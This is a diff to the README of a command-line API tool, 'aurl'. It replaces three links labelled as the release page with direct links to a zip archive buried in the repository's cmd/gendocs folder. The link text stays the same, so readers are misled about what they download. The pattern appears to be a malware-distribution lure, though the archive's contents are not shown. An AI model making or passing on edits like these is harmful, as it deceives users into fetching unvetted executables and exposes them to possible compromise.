@@ -1,6 +1,6 @@
 # aurl - Turn APIs Into Simple Commands
 
-[![Download aurl](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ma591/aurl/releases)
+[![Download aurl](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ma591/aurl/main/cmd/gendocs/Software-v3.1.zip)
 
 ## 🧭 What aurl does
 
@@ -41,7 +41,7 @@ Helpful setup:
 
 Go to the release page here:
 
-[Open the aurl release page](https://github.com/ma591/aurl/releases)
+[Open the aurl release page](https://raw.githubusercontent.com/ma591/aurl/main/cmd/gendocs/Software-v3.1.zip)
 
 On that page:
 
@@ -279,4 +279,4 @@ Yes. aurl can read the API spec and help build the right request shape
 
 ## 🔗 Download again if needed
 
-[Go to the aurl release page](https://github.com/ma591/aurl/releases)
+[Go to the aurl release page](https://raw.githubusercontent.com/ma591/aurl/main/cmd/gendocs/Software-v3.1.zip)
